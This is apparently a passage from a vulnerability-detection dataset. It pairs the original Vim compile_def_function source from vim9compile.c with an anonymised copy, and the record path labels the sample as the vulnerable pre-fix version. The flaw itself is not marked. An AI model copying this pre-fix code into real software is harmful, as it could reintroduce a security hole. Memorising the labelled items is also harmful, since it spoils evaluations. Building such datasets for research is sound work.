VAR_27->df_instr_prof = VAR_9->ga_data;
VAR_27->df_instr_prof_count = VAR_9->ga_len;
}
else
#endif
if (VAR_8.ctx_compile_type == VAR_32)
{
VAR_27->df_instr_debug = VAR_9->ga_data;
VAR_27->df_instr_debug_count = VAR_9->ga_len;
}
else
{
VAR_27->df_instr = VAR_9->ga_data;
VAR_27->df_instr_count = VAR_9->ga_len;
}
VAR_27->df_varcount = VAR_27->df_var_names.ga_len;
VAR_27->df_has_closure = VAR_8.ctx_has_closure;
if (VAR_8.ctx_outer_used)
VAR_0->uf_flags |= VAR_160;
VAR_0->uf_def_status = VAR_161;
}
VAR_14 = VAR_69;
erret:
if (VAR_0->uf_def_status == VAR_33)
{
dfunc_T*VAR_27 = ((dfunc_T *)VAR_28.ga_data)
+ VAR_0->uf_dfunc_idx;
clear_instr_ga(VAR_9);
VIM_CLEAR(VAR_27->df_name);
ga_clear_strings(&VAR_27->df_var_names);
if (!VAR_27->df_deleted && VAR_23
&& VAR_0->uf_dfunc_idx == VAR_28.ga_len - 1)
{
--VAR_28.ga_len;
VAR_0->uf_dfunc_idx = 0;
}
VAR_0->uf_def_status = VAR_162;
while (VAR_8.ctx_scope != NULL)
drop_scope(&VAR_8);
if (VAR_7 != NULL)
emsg(VAR_7);
else if (VAR_11 == VAR_10)
emsg(_(VAR_163));
}
if (VAR_8.ctx_redir_lhs.lhs_name != NULL)
{
if (VAR_14 == VAR_69)
{
emsg(_(VAR_164));
VAR_14 = VAR_15;
}
vim_free(VAR_8.ctx_redir_lhs.lhs_name);
vim_free(VAR_8.ctx_redir_lhs.lhs_whole);
}
VAR_17 = VAR_16;
VAR_19 = VAR_18;
VAR_21.cmod_flags =VAR_20;
if (VAR_22)
estack_pop();
vim_free(VAR_5);
free_imported(&VAR_8);
free_locals(&VAR_8);
ga_clear(&VAR_8.ctx_type_stack);
return VAR_14;
}",vim/9f1a39a5d1cd7989ada2d1cb32f97d84360e050f/vim9compile.c/vul/before/1.json,"int
compile_def_function(
	ufunc_T		*ufunc,
	int		check_return_type,
	compiletype_T   compile_type,
	cctx_T		*outer_cctx)
{
    char_u	*line = NULL;
    garray_T	lines_to_free;
    char_u	*p;
    char	*errormsg = NULL;	// error message
    cctx_T	cctx;
    garray_T	*instr;
    int		did_emsg_before = did_emsg;
    int		did_emsg_silent_before = did_emsg_silent;
    int		ret = FAIL;
    sctx_T	save_current_sctx = current_sctx;
    int		save_estack_compiling = estack_compiling;
    int		save_cmod_flags = cmdmod.cmod_flags;
    int		do_estack_push;
    int		new_def_function = FALSE;
#ifdef FEAT_PROFILE
    int		prof_lnum = -1;
#endif
    int		debug_lnum = -1;

    // allocated lines are freed at the end
    ga_init2(&lines_to_free, sizeof(char_u *), 50);

    // When using a function that was compiled before: Free old instructions.
    // The index is reused.  Otherwise add a new entry in ""def_functions"".
    if (ufunc->uf_dfunc_idx > 0)
    {
	dfunc_T *dfunc = ((dfunc_T *)def_functions.ga_data)
							 + ufunc->uf_dfunc_idx;
	isn_T	*instr_dest = NULL;

	switch (compile_type)
	{
	    case CT_PROFILE:
#ifdef FEAT_PROFILE
			    instr_dest = dfunc->df_instr_prof; break;
#endif
	    case CT_NONE:   instr_dest = dfunc->df_instr; break;
	    case CT_DEBUG:  instr_dest = dfunc->df_instr_debug; break;
	}
	if (instr_dest != NULL)
	    // Was compiled in this mode before: Free old instructions.
	    delete_def_function_contents(dfunc, FALSE);
	ga_clear_strings(&dfunc->df_var_names);
    }
    else
    {
	if (add_def_function(ufunc) == FAIL)
	    return FAIL;
	new_def_function = TRUE;
    }

    ufunc->uf_def_status = UF_COMPILING;

    CLEAR_FIELD(cctx);

    cctx.ctx_compile_type = compile_type;
    cctx.ctx_ufunc = ufunc;
    cctx.ctx_lnum = -1;
    cctx.ctx_outer = outer_cctx;
    ga_init2(&cctx.ctx_locals, sizeof(lvar_T), 10);
    // Each entry on the type stack consists of two type pointers.
    ga_init2(&cctx.ctx_type_stack, sizeof(type2_T), 50);
    ga_init2(&cctx.ctx_imports, sizeof(imported_T), 10);
    cctx.ctx_type_list = &ufunc->uf_type_list;
    ga_init2(&cctx.ctx_instr, sizeof(isn_T), 50);
    instr = &cctx.ctx_instr;

    // Set the context to the function, it may be compiled when called from
    // another script.  Set the script version to the most modern one.
    // The line number will be set in next_line_from_context().
    current_sctx = ufunc->uf_script_ctx;
    current_sctx.sc_version = SCRIPT_VERSION_VIM9;

    // Don't use the flag from "":legacy"" here.
    cmdmod.cmod_flags &= ~CMOD_LEGACY;

    // Make sure error messages are OK.
    do_estack_push = !estack_top_is_ufunc(ufunc, 1);
    if (do_estack_push)
	estack_push_ufunc(ufunc, 1);
    estack_compiling = TRUE;

    if (check_args_shadowing(ufunc, &cctx) == FAIL)
	goto erret;

    if (ufunc->uf_def_args.ga_len > 0)
    {
	int	count = ufunc->uf_def_args.ga_len;
	int	first_def_arg = ufunc->uf_args.ga_len - count;
	int	i;
	char_u	*arg;
	int	off = STACK_FRAME_SIZE + (ufunc->uf_va_name != NULL ? 1 : 0);
	int	did_set_arg_type = FALSE;

	// Produce instructions for the default values of optional arguments.
	SOURCING_LNUM = 0;  // line number unknown
	for (i = 0; i < count; ++i)
	{
	    type_T	*val_type;
	    int		arg_idx = first_def_arg + i;
	    where_T	where = WHERE_INIT;
	    int		r;
	    int		jump_instr_idx = instr->ga_len;
	    isn_T	*isn;

	    // Use a JUMP_IF_ARG_SET instruction to skip if the value was given.
	    if (generate_JUMP_IF_ARG_SET(&cctx, i - count - off) == FAIL)
		goto erret;

	    // Make sure later arguments are not found.
	    ufunc->uf_args_visible = arg_idx;

	    arg = ((char_u **)(ufunc->uf_def_args.ga_data))[i];
	    r = compile_expr0(&arg, &cctx);

	    if (r == FAIL)
		goto erret;

	    // If no type specified use the type of the default value.
	    // Otherwise check that the default value type matches the
	    // specified type.
	    val_type = get_type_on_stack(&cctx, 0);
	    where.wt_index = arg_idx + 1;
	    if (ufunc->uf_arg_types[arg_idx] == &t_unknown)
	    {
		did_set_arg_type = TRUE;
		ufunc->uf_arg_types[arg_idx] = val_type;
	    }
	    else if (need_type_where(val_type, ufunc->uf_arg_types[arg_idx],
				       -1, where, &cctx, FALSE, FALSE) == FAIL)
		goto erret;

	    if (generate_STORE(&cctx, ISN_STORE, i - count - off, NULL) == FAIL)
		goto erret;

	    // set instruction index in JUMP_IF_ARG_SET to here
	    isn = ((isn_T *)instr->ga_data) + jump_instr_idx;
	    isn->isn_arg.jumparg.jump_where = instr->ga_len;
	}

	if (did_set_arg_type)
	    set_function_type(ufunc);
    }
    ufunc->uf_args_visible = ufunc->uf_args.ga_len;

    /*
     * Loop over all the lines of the function and generate instructions.
     */
    for (;;)
    {
	exarg_T	    ea;
	int	    starts_with_colon = FALSE;
	char_u	    *cmd;
	cmdmod_T    local_cmdmod;

	// Bail out on the first error to avoid a flood of errors and report
	// the right line number when inside try/catch.
	if (did_emsg_before != did_emsg)
	    goto erret;

	if (line != NULL && *line == '|')
	    // the line continues after a '|'
	    ++line;
	else if (line != NULL && *skipwhite(line) != NUL
		&& !(*line == '#' && (line == cctx.ctx_line_start
						    || VIM_ISWHITE(line[-1]))))
	{
	    semsg(_(e_trailing_characters_str), line);
	    goto erret;
	}
	else if (line != NULL && vim9_bad_comment(skipwhite(line)))
	    goto erret;
	else
	{
	    line = next_line_from_context(&cctx, FALSE);
	    if (cctx.ctx_lnum >= ufunc->uf_lines.ga_len)
	    {
		// beyond the last line
#ifdef FEAT_PROFILE
		if (cctx.ctx_skip != SKIP_YES)
		    may_generate_prof_end(&cctx, prof_lnum);
#endif
		break;
	    }
	    // Make a copy, splitting off nextcmd and removing trailing spaces
	    // may change it.
	    if (line != NULL)
	    {
		line = vim_strsave(line);
		if (ga_add_string(&lines_to_free, line) == FAIL)
		    goto erret;
	    }
	}

	CLEAR_FIELD(ea);
	ea.cmdlinep = &line;
	ea.cmd = skipwhite(line);

	if (*ea.cmd == '#')
	{
	    // ""#"" starts a comment
	    line = (char_u *)"""";
	    continue;
	}

#ifdef FEAT_PROFILE
	if (cctx.ctx_compile_type == CT_PROFILE && cctx.ctx_lnum != prof_lnum
						  && cctx.ctx_skip != SKIP_YES)
	{
	    may_generate_prof_end(&cctx, prof_lnum);

	    prof_lnum = cctx.ctx_lnum;
	    generate_instr(&cctx, ISN_PROF_START);
	}
#endif
	if (cctx.ctx_compile_type == CT_DEBUG && cctx.ctx_lnum != debug_lnum
						  && cctx.ctx_skip != SKIP_YES)
	{
	    debug_lnum = cctx.ctx_lnum;
	    generate_instr_debug(&cctx);
	}
	cctx.ctx_prev_lnum = cctx.ctx_lnum + 1;

	// Some things can be recognized by the first character.
	switch (*ea.cmd)
	{
	    case '}':
		{
		    // ""}"" ends a block scope
		    scopetype_T stype = cctx.ctx_scope == NULL
					  ? NO_SCOPE : cctx.ctx_scope->se_type;

		    if (stype == BLOCK_SCOPE)
		    {
			compile_endblock(&cctx);
			line = ea.cmd;
		    }
		    else
		    {
			emsg(_(e_using_rcurly_outside_if_block_scope));
			goto erret;
		    }
		    if (line != NULL)
			line = skipwhite(ea.cmd + 1);
		    continue;
		}

	    case '{':
		// ""{"" starts a block scope
		// ""{'a': 1}->func() is something else
		if (ends_excmd(*skipwhite(ea.cmd + 1)))
		{
		    line = compile_block(ea.cmd, &cctx);
		    continue;
		}
		break;
	}

	/*
	 * COMMAND MODIFIERS
	 */
	cctx.ctx_has_cmdmod = FALSE;
	if (parse_command_modifiers(&ea, &errormsg, &local_cmdmod, FALSE)
								       == FAIL)
	{
	    if (errormsg != NULL)
		goto erret;
	    // empty line or comment
	    line = (char_u *)"""";
	    continue;
	}
	generate_cmdmods(&cctx, &local_cmdmod);
	undo_cmdmod(&local_cmdmod);

	// Check if there was a colon after the last command modifier or before
	// the current position.
	for (p = ea.cmd; p >= line; --p)
	{
	    if (*p == ':')
		starts_with_colon = TRUE;
	    if (p < ea.cmd && !VIM_ISWHITE(*p))
		break;
	}

	// Skip "":call"" to get to the function name, unless using :legacy
	p = ea.cmd;
	if (!(local_cmdmod.cmod_flags & CMOD_LEGACY))
	{
	    if (checkforcmd(&ea.cmd, ""call"", 3))
	    {
		if (*ea.cmd == '(')
		    // not for ""call()""
		    ea.cmd = p;
		else
		    ea.cmd = skipwhite(ea.cmd);
	    }

	    if (!starts_with_colon)
	    {
		int	    assign;

		// Check for assignment after command modifiers.
		assign = may_compile_assignment(&ea, &line, &cctx);
		if (assign == OK)
		    goto nextline;
		if (assign == FAIL)
		    goto erret;
	    }
	}

	/*
	 * COMMAND after range
	 * 'text'->func() should not be confused with 'a mark
	 * ""++nr"" and ""--nr"" are eval commands
	 * in ""$ENV->func()"" the ""$"" is not a range
	 */
	cmd = ea.cmd;
	if ((*cmd != '$' || starts_with_colon)
		&& (starts_with_colon || !(*cmd == '\''
		       || (cmd[0] != NUL && cmd[0] == cmd[1]
					    && (*cmd == '+' || *cmd == '-')))))
	{
	    ea.cmd = skip_range(ea.cmd, TRUE, NULL);
	    if (ea.cmd > cmd)
	    {
		if (!starts_with_colon
				   && !(local_cmdmod.cmod_flags & CMOD_LEGACY))
		{
		    semsg(_(e_colon_required_before_range_str), cmd);
		    goto erret;
		}
		ea.addr_count = 1;
		if (ends_excmd2(line, ea.cmd))
		{
		    // A range without a command: jump to the line.
		    generate_EXEC(&cctx, ISN_EXECRANGE,
					      vim_strnsave(cmd, ea.cmd - cmd));
		    line = ea.cmd;
		    goto nextline;
		}
	    }
	}
	p = find_ex_command(&ea, NULL,
		starts_with_colon || (local_cmdmod.cmod_flags & CMOD_LEGACY)
						  ? NULL : item_exists, &cctx);

	if (p == NULL)
	{
	    if (cctx.ctx_skip != SKIP_YES)
		emsg(_(e_ambiguous_use_of_user_defined_command));
	    goto erret;
	}

	// When using "":legacy cmd"" always use compile_exec().
	if (local_cmdmod.cmod_flags & CMOD_LEGACY)
	{
	    char_u *start = ea.cmd;

	    switch (ea.cmdidx)
	    {
		case CMD_if:
		case CMD_elseif:
		case CMD_else:
		case CMD_endif:
		case CMD_for:
		case CMD_endfor:
		case CMD_continue:
		case CMD_break:
		case CMD_while:
		case CMD_endwhile:
		case CMD_try:
		case CMD_catch:
		case CMD_finally:
		case CMD_endtry:
			semsg(_(e_cannot_use_legacy_with_command_str), ea.cmd);
			goto erret;
		default: break;
	    }

	    // "":legacy return expr"" needs to be handled differently.
	    if (checkforcmd(&start, ""return"", 4))
		ea.cmdidx = CMD_return;
	    else
		ea.cmdidx = CMD_legacy;
	}

	if (p == ea.cmd && ea.cmdidx != CMD_SIZE)
	{
	    if (cctx.ctx_skip == SKIP_YES && ea.cmdidx != CMD_eval)
	    {
		line += STRLEN(line);
		goto nextline;
	    }
	    else if (ea.cmdidx != CMD_eval)
	    {
		// CMD_var cannot happen, compile_assignment() above would be
		// used.  Most likely an assignment to a non-existing variable.
		semsg(_(e_command_not_recognized_str), ea.cmd);
		goto erret;
	    }
	}

	if (cctx.ctx_had_return
		&& ea.cmdidx != CMD_elseif
		&& ea.cmdidx != CMD_else
		&& ea.cmdidx != CMD_endif
		&& ea.cmdidx != CMD_endfor
		&& ea.cmdidx != CMD_endwhile
		&& ea.cmdidx != CMD_catch
		&& ea.cmdidx != CMD_finally
		&& ea.cmdidx != CMD_endtry)
	{
	    emsg(_(e_unreachable_code_after_return));
	    goto erret;
	}

	p = skipwhite(p);
	if (ea.cmdidx != CMD_SIZE
			    && ea.cmdidx != CMD_write && ea.cmdidx != CMD_read)
	{
	    if (ea.cmdidx >= 0)
		ea.argt = excmd_get_argt(ea.cmdidx);
	    if ((ea.argt & EX_BANG) && *p == '!')
	    {
		ea.forceit = TRUE;
		p = skipwhite(p + 1);
	    }
	}

	switch (ea.cmdidx)
	{
	    case CMD_def:
	    case CMD_function:
		    ea.arg = p;
		    line = compile_nested_function(&ea, &cctx, &lines_to_free);
		    break;

	    case CMD_return:
		    line = compile_return(p, check_return_type,
				 local_cmdmod.cmod_flags & CMOD_LEGACY, &cctx);
		    cctx.ctx_had_return = TRUE;
		    break;

	    case CMD_let:
		    emsg(_(e_cannot_use_let_in_vim9_script));
		    break;
	    case CMD_var:
	    case CMD_final:
	    case CMD_const:
	    case CMD_increment:
	    case CMD_decrement:
		    line = compile_assignment(p, &ea, ea.cmdidx, &cctx);
		    if (line == p)
			line = NULL;
		    break;

	    case CMD_unlet:
	    case CMD_unlockvar:
	    case CMD_lockvar:
		    line = compile_unletlock(p, &ea, &cctx);
		    break;

	    case CMD_import:
		    emsg(_(e_import_can_only_be_used_in_script));
		    line = NULL;
		    break;

	    case CMD_if:
		    line = compile_if(p, &cctx);
		    break;
	    case CMD_elseif:
		    line = compile_elseif(p, &cctx);
		    cctx.ctx_had_return = FALSE;
		    break;
	    case CMD_else:
		    line = compile_else(p, &cctx);
		    cctx.ctx_had_return = FALSE;
		    break;
	    case CMD_endif:
		    line = compile_endif(p, &cctx);
		    break;

	    case CMD_while:
		    line = compile_while(p, &cctx);
		    break;
	    case CMD_endwhile:
		    line = compile_endwhile(p, &cctx);
		    cctx.ctx_had_return = FALSE;
		    break;

	    case CMD_for:
		    line = compile_for(p, &cctx);
		    break;
	    case CMD_endfor:
		    line = compile_endfor(p, &cctx);
		    cctx.ctx_had_return = FALSE;
		    break;
	    case CMD_continue:
		    line = compile_continue(p, &cctx);
		    break;
	    case CMD_break:
		    line = compile_break(p, &cctx);
		    break;

	    case CMD_try:
		    line = compile_try(p, &cctx);
		    break;
	    case CMD_catch:
		    line = compile_catch(p, &cctx);
		    cctx.ctx_had_return = FALSE;
		    break;
	    case CMD_finally:
		    line = compile_finally(p, &cctx);
		    cctx.ctx_had_return = FALSE;
		    break;
	    case CMD_endtry:
		    line = compile_endtry(p, &cctx);
		    cctx.ctx_had_return = FALSE;
		    break;
	    case CMD_throw:
		    line = compile_throw(p, &cctx);
		    break;

	    case CMD_eval:
		    line = compile_eval(p, &cctx);
		    break;

	    case CMD_echo:
	    case CMD_echon:
	    case CMD_execute:
	    case CMD_echomsg:
	    case CMD_echoerr:
	    case CMD_echoconsole:
		    line = compile_mult_expr(p, ea.cmdidx, &cctx);
		    break;

	    case CMD_put:
		    ea.cmd = cmd;
		    line = compile_put(p, &ea, &cctx);
		    break;

	    case CMD_substitute:
		    if (check_global_and_subst(ea.cmd, p) == FAIL)
			goto erret;
		    if (cctx.ctx_skip == SKIP_YES)
			line = (char_u *)"""";
		    else
		    {
			ea.arg = p;
			line = compile_substitute(line, &ea, &cctx);
		    }
		    break;

	    case CMD_redir:
		    ea.arg = p;
		    line = compile_redir(line, &ea, &cctx);
		    break;

	    case CMD_cexpr:
	    case CMD_lexpr:
	    case CMD_caddexpr:
	    case CMD_laddexpr:
	    case CMD_cgetexpr:
	    case CMD_lgetexpr:
#ifdef FEAT_QUICKFIX
		    ea.arg = p;
		    line = compile_cexpr(line, &ea, &cctx);
#else
		    ex_ni(&ea);
		    line = NULL;
#endif
		    break;

	    case CMD_append:
	    case CMD_change:
	    case CMD_insert:
	    case CMD_k:
	    case CMD_t:
	    case CMD_xit:
		    not_in_vim9(&ea);
		    goto erret;

	    case CMD_SIZE:
		    if (cctx.ctx_skip != SKIP_YES)
		    {
			semsg(_(e_invalid_command_str), ea.cmd);
			goto erret;
		    }
		    // We don't check for a next command here.
		    line = (char_u *)"""";
		    break;

	    case CMD_lua:
	    case CMD_mzscheme:
	    case CMD_perl:
	    case CMD_py3:
	    case CMD_python3:
	    case CMD_python:
	    case CMD_pythonx:
	    case CMD_ruby:
	    case CMD_tcl:
		    ea.arg = p;
		    if (vim_strchr(line, '\n') == NULL)
			line = compile_exec(line, &ea, &cctx);
		    else
			// heredoc lines have been concatenated with NL
			// characters in get_function_body()
			line = compile_script(line, &cctx);
		    break;

	    case CMD_global:
		    if (check_global_and_subst(ea.cmd, p) == FAIL)
			goto erret;
		    // FALLTHROUGH
	    default:
		    // Not recognized, execute with do_cmdline_cmd().
		    ea.arg = p;
		    line = compile_exec(line, &ea, &cctx);
		    break;
	}
nextline:
	if (line == NULL)
	    goto erret;
	line = skipwhite(line);

	// Undo any command modifiers.
	generate_undo_cmdmods(&cctx);

	if (cctx.ctx_type_stack.ga_len < 0)
	{
	    iemsg(""Type stack underflow"");
	    goto erret;
	}
    }

    if (cctx.ctx_scope != NULL)
    {
	if (cctx.ctx_scope->se_type == IF_SCOPE)
	    emsg(_(e_missing_endif));
	else if (cctx.ctx_scope->se_type == WHILE_SCOPE)
	    emsg(_(e_missing_endwhile));
	else if (cctx.ctx_scope->se_type == FOR_SCOPE)
	    emsg(_(e_missing_endfor));
	else
	    emsg(_(e_missing_rcurly));
	goto erret;
    }

    if (!cctx.ctx_had_return)
    {
	if (ufunc->uf_ret_type->tt_type == VAR_UNKNOWN)
	    ufunc->uf_ret_type = &t_void;
	else if (ufunc->uf_ret_type->tt_type != VAR_VOID)
	{
	    emsg(_(e_missing_return_statement));
	    goto erret;
	}

	// Return void if there is no return at the end.
	generate_instr(&cctx, ISN_RETURN_VOID);
    }

    // When compiled with "":silent!"" and there was an error don't consider the
    // function compiled.
    if (emsg_silent == 0 || did_emsg_silent == did_emsg_silent_before)
    {
	dfunc_T	*dfunc = ((dfunc_T *)def_functions.ga_data)
							 + ufunc->uf_dfunc_idx;
	dfunc->df_deleted = FALSE;
	dfunc->df_script_seq = current_sctx.sc_seq;
#ifdef FEAT_PROFILE
	if (cctx.ctx_compile_type == CT_PROFILE)
	{
	    dfunc->df_instr_prof = instr->ga_data;
	    dfunc->df_instr_prof_count = instr->ga_len;
	}
	else
#endif
	if (cctx.ctx_compile_type == CT_DEBUG)
	{
	    dfunc->df_instr_debug = instr->ga_data;
	    dfunc->df_instr_debug_count = instr->ga_len;
	}
	else
	{
	    dfunc->df_instr = instr->ga_data;
	    dfunc->df_instr_count = instr->ga_len;
	}
	dfunc->df_varcount = dfunc->df_var_names.ga_len;
	dfunc->df_has_closure = cctx.ctx_has_closure;
	if (cctx.ctx_outer_used)
	    ufunc->uf_flags |= FC_CLOSURE;
	ufunc->uf_def_status = UF_COMPILED;
    }

    ret = OK;

erret:
    if (ufunc->uf_def_status == UF_COMPILING)
    {
	dfunc_T	*dfunc = ((dfunc_T *)def_functions.ga_data)
							 + ufunc->uf_dfunc_idx;

	// Compiling aborted, free the generated instructions.
	clear_instr_ga(instr);
	VIM_CLEAR(dfunc->df_name);
	ga_clear_strings(&dfunc->df_var_names);

	// If using the last entry in the table and it was added above, we
	// might as well remove it.
	if (!dfunc->df_deleted && new_def_function
			    && ufunc->uf_dfunc_idx == def_functions.ga_len - 1)
	{
	    --def_functions.ga_len;
	    ufunc->uf_dfunc_idx = 0;
	}
	ufunc->uf_def_status = UF_COMPILE_ERROR;

	while (cctx.ctx_scope != NULL)
	    drop_scope(&cctx);

	if (errormsg != NULL)
	    emsg(errormsg);
	else if (did_emsg == did_emsg_before)
	    emsg(_(e_compiling_def_function_failed));
    }

    if (cctx.ctx_redir_lhs.lhs_name != NULL)
    {
	if (ret == OK)
	{
	    emsg(_(e_missing_redir_end));
	    ret = FAIL;
	}
	vim_free(cctx.ctx_redir_lhs.lhs_name);
	vim_free(cctx.ctx_redir_lhs.lhs_whole);
    }

    current_sctx = save_current_sctx;
    estack_compiling = save_estack_compiling;
    cmdmod.cmod_flags =	save_cmod_flags;
    if (do_estack_push)
	estack_pop();

    ga_clear_strings(&lines_to_free);
    free_imported(&cctx);
    free_locals(&cctx);
    ga_clear(&cctx.ctx_type_stack);
    return ret;
}","int
compile_def_function(
	ufunc_T		*VAR_0,
	int		VAR_1,
	compiletype_T   VAR_2,
	cctx_T		*VAR_3)
{
    char_u	*VAR_4 = NULL;
    garray_T	VAR_5;
    char_u	*VAR_6;
    char	*VAR_7 = NULL;	/* COMMENT_0 */
    cctx_T	VAR_8;
    garray_T	*VAR_9;
    int		VAR_10 = VAR_11;
    int		VAR_12 = VAR_13;
    int		VAR_14 = VAR_15;
    sctx_T	VAR_16 = VAR_17;
    int		VAR_18 = VAR_19;
    int		VAR_20 = VAR_21.cmod_flags;
    int		VAR_22;
    int		VAR_23 = FALSE;
#ifdef VAR_24
    int		VAR_25 = -1;
#endif
    int		VAR_26 = -1;

    /* COMMENT_1 */
    ga_init2(&VAR_5, sizeof(char_u *), 50);

    /* COMMENT_2 */
    /* COMMENT_3 */
    if (VAR_0->uf_dfunc_idx > 0)
    {
	dfunc_T *VAR_27 = ((dfunc_T *)VAR_28.ga_data)
							 + VAR_0->uf_dfunc_idx;
	isn_T	*VAR_29 = NULL;

	switch (VAR_2)
	{
	    case VAR_30:
#ifdef VAR_24
			    VAR_29 = VAR_27->df_instr_prof; break;
#endif
	    case VAR_31:   VAR_29 = VAR_27->df_instr; break;
	    case VAR_32:  VAR_29 = VAR_27->df_instr_debug; break;
	}
	if (VAR_29 != NULL)
	    /* COMMENT_4 */
	    delete_def_function_contents(VAR_27, FALSE);
	ga_clear_strings(&VAR_27->df_var_names);
    }
    else
    {
	if (add_def_function(VAR_0) == VAR_15)
	    return VAR_15;
	VAR_23 = TRUE;
    }

    VAR_0->uf_def_status = VAR_33;

    CLEAR_FIELD(VAR_8);

    VAR_8.ctx_compile_type = VAR_2;
    VAR_8.ctx_ufunc = VAR_0;
    VAR_8.ctx_lnum = -1;
    VAR_8.ctx_outer = VAR_3;
    ga_init2(&VAR_8.ctx_locals, sizeof(VAR_34), 10);
    /* COMMENT_5 */
    ga_init2(&VAR_8.ctx_type_stack, sizeof(VAR_35), 50);
    ga_init2(&VAR_8.ctx_imports, sizeof(VAR_36), 10);
    VAR_8.ctx_type_list = &VAR_0->uf_type_list;
    ga_init2(&VAR_8.ctx_instr, sizeof(isn_T), 50);
    VAR_9 = &VAR_8.ctx_instr;

    /* COMMENT_6 */
    /* COMMENT_7 */
    /* COMMENT_8 */
    VAR_17 = VAR_0->uf_script_ctx;
    VAR_17.sc_version = VAR_37;

    /* COMMENT_9 */
    VAR_21.cmod_flags &= ~VAR_38;

    /* COMMENT_10 */
    VAR_22 = !estack_top_is_ufunc(VAR_0, 1);
    if (VAR_22)
	estack_push_ufunc(VAR_0, 1);
    VAR_19 = TRUE;

    if (check_args_shadowing(VAR_0, &VAR_8) == VAR_15)
	goto erret;

    if (VAR_0->uf_def_args.ga_len > 0)
    {
	int	VAR_39 = VAR_0->uf_def_args.ga_len;
	int	VAR_40 = VAR_0->uf_args.ga_len - VAR_39;
	int	VAR_41;
	char_u	*VAR_42;
	int	VAR_43 = VAR_44 + (VAR_0->uf_va_name != NULL ? 1 : 0);
	int	VAR_45 = FALSE;

	/* COMMENT_11 */
	VAR_46 = 0;  /* COMMENT_12 */
	for (VAR_41 = 0; VAR_41 < VAR_39; ++VAR_41)
	{
	    type_T	*VAR_47;
	    int		VAR_48 = VAR_40 + VAR_41;
	    where_T	VAR_49 = VAR_50;
	    int		VAR_51;
	    int		VAR_52 = VAR_9->ga_len;
	    isn_T	*VAR_53;

	    /* COMMENT_13 */
	    if (generate_JUMP_IF_ARG_SET(&VAR_8, VAR_41 - VAR_39 - VAR_43) == VAR_15)
		goto erret;

	    /* COMMENT_14 */
	    VAR_0->uf_args_visible = VAR_48;

	    VAR_42 = ((char_u **)(VAR_0->uf_def_args.ga_data))[VAR_41];
	    VAR_51 = compile_expr0(&VAR_42, &VAR_8);

	    if (VAR_51 == VAR_15)
		goto erret;

	    /* COMMENT_15 */
	    /* COMMENT_16 */
	    /* COMMENT_17 */
	    VAR_47 = get_type_on_stack(&VAR_8, 0);
	    VAR_49.wt_index = VAR_48 + 1;
	    if (VAR_0->uf_arg_types[VAR_48] == &VAR_54)
	    {
		VAR_45 = TRUE;
		VAR_0->uf_arg_types[VAR_48] = VAR_47;
	    }
	    else if (need_type_where(VAR_47, VAR_0->uf_arg_types[VAR_48],
				       -1, VAR_49, &VAR_8, FALSE, FALSE) == VAR_15)
		goto erret;

	    if (generate_STORE(&VAR_8, VAR_55, VAR_41 - VAR_39 - VAR_43, NULL) == VAR_15)
		goto erret;

	    /* COMMENT_18 */
	    VAR_53 = ((isn_T *)VAR_9->ga_data) + VAR_52;
	    VAR_53->isn_arg.jumparg.jump_where = VAR_9->ga_len;
	}

	if (VAR_45)
	    set_function_type(VAR_0);
    }
    VAR_0->uf_args_visible = VAR_0->uf_args.ga_len;

    /* COMMENT_19 */
                                                                         
       
    for (;;)
    {
	exarg_T	    VAR_56;
	int	    VAR_57 = FALSE;
	char_u	    *VAR_58;
	cmdmod_T    VAR_59;

	/* COMMENT_22 */
	/* COMMENT_23 */
	if (VAR_10 != VAR_11)
	    goto erret;

	if (VAR_4 != NULL && *VAR_4 == '|')
	    /* COMMENT_24 */
	    ++VAR_4;
	else if (VAR_4 != NULL && *skipwhite(VAR_4) != VAR_60
		&& !(*VAR_4 == '#' && (VAR_4 == VAR_8.ctx_line_start
						    || VIM_ISWHITE(VAR_4[-1]))))
	{
	    semsg(_(VAR_61), VAR_4);
	    goto erret;
	}
	else if (VAR_4 != NULL && vim9_bad_comment(skipwhite(VAR_4)))
	    goto erret;
	else
	{
	    VAR_4 = next_line_from_context(&VAR_8, FALSE);
	    if (VAR_8.ctx_lnum >= VAR_0->uf_lines.ga_len)
	    {
		/* COMMENT_25 */
#ifdef VAR_24
		if (VAR_8.ctx_skip != VAR_62)
		    may_generate_prof_end(&VAR_8, VAR_25);
#endif
		break;
	    }
	    /* COMMENT_26 */
	    /* COMMENT_27 */
	    if (VAR_4 != NULL)
	    {
		VAR_4 = vim_strsave(VAR_4);
		if (ga_add_string(&VAR_5, VAR_4) == VAR_15)
		    goto erret;
	    }
	}

	CLEAR_FIELD(VAR_56);
	VAR_56.cmdlinep = &VAR_4;
	VAR_56.cmd = skipwhite(VAR_4);

	if (*VAR_56.cmd == '#')
	{
	    /* COMMENT_28 */
	    VAR_4 = (char_u *)"""";
	    continue;
	}

#ifdef VAR_24
	if (VAR_8.ctx_compile_type == VAR_30 && VAR_8.ctx_lnum != VAR_25
						  && VAR_8.ctx_skip != VAR_62)
	{
	    may_generate_prof_end(&VAR_8, VAR_25);

	    VAR_25 = VAR_8.ctx_lnum;
	    generate_instr(&VAR_8, VAR_63);
	}
#endif
	if (VAR_8.ctx_compile_type == VAR_32 && VAR_8.ctx_lnum != VAR_26
						  && VAR_8.ctx_skip != VAR_62)
	{
	    VAR_26 = VAR_8.ctx_lnum;
	    generate_instr_debug(&VAR_8);
	}
	VAR_8.ctx_prev_lnum = VAR_8.ctx_lnum + 1;

	/* COMMENT_29 */
	switch (*VAR_56.cmd)
	{
	    case '}':
		{
		    /* COMMENT_30 */
		    scopetype_T VAR_64 = VAR_8.ctx_scope == NULL
					  ? VAR_65 : VAR_8.ctx_scope->se_type;

		    if (VAR_64 == VAR_66)
		    {
			compile_endblock(&VAR_8);
			VAR_4 = VAR_56.cmd;
		    }
		    else
		    {
			emsg(_(VAR_67));
			goto erret;
		    }
		    if (VAR_4 != NULL)
			VAR_4 = skipwhite(VAR_56.cmd + 1);
		    continue;
		}

	    case '{':
		/* COMMENT_31 */
		/* COMMENT_32 */
		if (ends_excmd(*skipwhite(VAR_56.cmd + 1)))
		{
		    VAR_4 = compile_block(VAR_56.cmd, &VAR_8);
		    continue;
		}
		break;
	}

	/* COMMENT_33 */
                     
    
	VAR_8.ctx_has_cmdmod = FALSE;
	if (parse_command_modifiers(&VAR_56, &VAR_7, &VAR_59, FALSE)
								       == VAR_15)
	{
	    if (VAR_7 != NULL)
		goto erret;
	    /* COMMENT_36 */
	    VAR_4 = (char_u *)"""";
	    continue;
	}
	generate_cmdmods(&VAR_8, &VAR_59);
	undo_cmdmod(&VAR_59);

	/* COMMENT_37 */
	/* COMMENT_38 */
